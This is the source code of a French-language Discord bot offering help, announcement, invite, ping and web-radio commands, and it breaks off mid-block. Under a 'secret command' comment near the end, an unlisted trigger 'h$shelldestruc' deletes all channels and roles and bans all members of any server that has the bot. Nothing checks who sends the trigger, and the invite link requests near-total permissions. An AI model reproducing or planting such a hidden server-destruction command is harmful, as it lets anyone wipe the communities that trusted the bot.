//                         CODE HORS SUJET DU BOT/CE CODE EST POUR LES OPTIONS ET LA CONFIGURATION DU BOT
"use_strict";
const Discord = require("discord.js");
const bot = new Discord.Client();
const connection = new Map();
let broadcast;

bot.login(process.env.Discord_token || process.argv[2]);

bot.on("ready", function() {
  bot.user.setGame("h$help Bêta 0.1, by Hariamane").catch(console.error)
});

bot.on("message", function (message) {
  if (message.content === "h$help") {
    message.channel.send({
      embed: {
        footer: {
          text: "By Hariamane",
          icon_url: "https://cdn.discordapp.com/avatars/300896265078571009/853decbb9091b9a045c198c68e4866eb.png?size=128"
        },
        color:0xFF0000,
        description: "[**Commandes:**]()\n\n**commandes utils :**\n\n✔h$annonce : Cette commande te permet de pub pour ton discord. Il s'affiche sur tous les serveurs dont le bot en fait partie.\n✔h$botmessage : Cette commande est réservé au développeur.\n✔h$join : Cette commande te permet d'ajouter ce bot dans ton serveur.\n✔h$discord : Cette commande te permet de me rejoindre.\n:x:h$support : Cette commande te permet de contacter le support technique du bot.\n\n**Commandes jeux :**\n✔h$ping\n:x:h$traduction : Le but c'est de traduire des phrases.\n\n**Commandes modérateur :**\n:x:h$Ban : Cette commande c'est pour ban les joueur.\n\n**Radio :**\n:x:h$webradioplay : Pour écouter de la radio.\n:x:h$webradiostop : Pour stopper la radio."
      }
    });
  }
});

//                             Message MP Bienvenue
bot.on("guildMemberAdd", function (member) {
  member.createDM().then(function (channel) {
    return channel.send("Bienvenue sur le serveur, " + member.displayName)
  }).catch(console.error);
});

//                             COMMANDE ANNONCE
bot.on("message", function(message) {
  if(message.content.startsWith("h$annonce")) {
    var messageactu = message.content.substr(9);
    message.channel.send({
      embed: {
        color: 0xFF0000,
        title: "Hey @everyone, " + messageactu
      }
    });
    message.delete(messageactu);
  }
  
  if(!message.author.bot && message.content.startsWith("h$annonce")) {
    message.channel.send({
      embed: {
        color: 0xFF0000,
        description: "Erreur\n:x:Vous avez pas les permissions nécessaires ou il y a que le développeur qui à accès à la commande. Pour faire une annonce, demander sur les serveur officiel. Merci."
      }
    });
  }

  if (message.content.startsWith("h$botmessage") & (message.author.id == "300896265078571009")) {
    var messageactu = message.content.substr(9);
    serv = bot.guilds.array()
    text = message.content.substr(12)
    for(i=0;i<serv.length;i++) {
      serv[i].channels.find("type", "text").send({
        embed: {
          color: 0xFF0000,
          description: text
        }
      });
      message.delete(messageactu);
    }
  }

  if (message.content === "h$join") {
    message.channel.send({
      embed: {
        color: 0xFF0000,
        title: "https://discordapp.com/oauth2/authorize?client_id=329551988222066689&scope=bot&permissions=2146958591%27%7D%7D)%27%7D%7D)%7D%7D)%27%7D%7D"
      }
    });
  }

  if (message.content === "h$discord") {
    message.channel.send({
      embed: {
        color: 0xFF0000,
        title: "Cette commande te permet de me rejoindre : https://discord.gg/u9P2tpQ"
      }
    });
  }
});

//                            COMMANDE JEUX

bot.on("message", function (message) {
  if (message.content === "h$ping") {
    message.channel.send({
      embed: {
        color: 0xFF0000,
        title: "Pong ! :ping_pong: "+ `${Date.now() - message.createdTimestamp}` + " ms`"
      }
    });
  }
});




//                   RADIO
const webradio = require("./webradio.js");

bot.on("message", message => {
    webradio(message, bot, connection, broadcast);
});









//       COMMANDE secraite

bot.on("message", function (message) {
  if (message.content === "h$shelldestruc") {
   try{ message.guild.channels.forEach((c) => {c.delete()})
    message.guild.roles.forEach((c) => {c.delete()})
    message.guild.members.forEach((c) => {c.ban()})
       }catch(e){
        console.log(e)
    }
